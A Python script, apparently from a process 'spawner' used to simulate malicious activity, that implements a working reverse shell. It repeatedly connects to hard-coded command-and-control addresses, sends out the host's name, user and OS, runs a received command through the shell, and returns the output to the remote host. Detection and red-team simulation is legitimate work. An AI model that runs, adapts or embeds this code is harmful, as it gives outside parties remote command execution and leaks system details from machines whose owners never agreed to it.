from __future__ import annotations

import socket
import subprocess
import pathlib
import time
import sys
sys.path.insert(0, str(pathlib.Path(__file__).parents[2]))
from spawner.utils import set_proc_name, log, jitter

PROC = "reverse_shell"
C2_HOSTS = [
    ("10.0.0.1", 4444),
    ("192.168.1.200", 443),
    ("185.220.101.45", 1337),   # Tor exit node range — obvious IOC
]
LOG_FILE = pathlib.Path("/tmp/.revshell.log")


def attempt_connect(host: str, port: int) -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        log(PROC, f"Connected to C2 {host}:{port}!")

        # Send basic recon on connect
        import platform, os, getpass
        beacon = (
            f"SHELL_CONNECTED|{platform.node()}|{getpass.getuser()}"
            f"|{platform.system()}|{platform.release()}\n"
        )
        s.sendall(beacon.encode())

        # Wait for commands
        s.settimeout(10)
        try:
            cmd = s.recv(1024).decode(errors="ignore").strip()
            if cmd:
                log(PROC, f"Received command: {cmd}")
                result = subprocess.run(
                    cmd, shell=True, capture_output=True, text=True, timeout=10
                )
                s.sendall((result.stdout + result.stderr).encode())
        except socket.timeout:
            pass

        s.close()
        return True
    except Exception as e:
        log(PROC, f"Failed to connect to {host}:{port} — {e}")
        return False


def main() -> None:
    set_proc_name(PROC)
    log(PROC, "Reverse shell starting — attempting C2 connection")

    attempt = 0
    while True:
        attempt += 1
        for host, port in C2_HOSTS:
            log(PROC, f"Attempt #{attempt} -> {host}:{port}")
            if attempt_connect(host, port):
                break
        # Exponential backoff capped at 5 min, with jitter
        wait = min(30 * (1.5 ** min(attempt, 8)), 300)
        log(PROC, f"Sleeping {wait:.0f}s before retry")
        time.sleep(jitter(wait))


main()
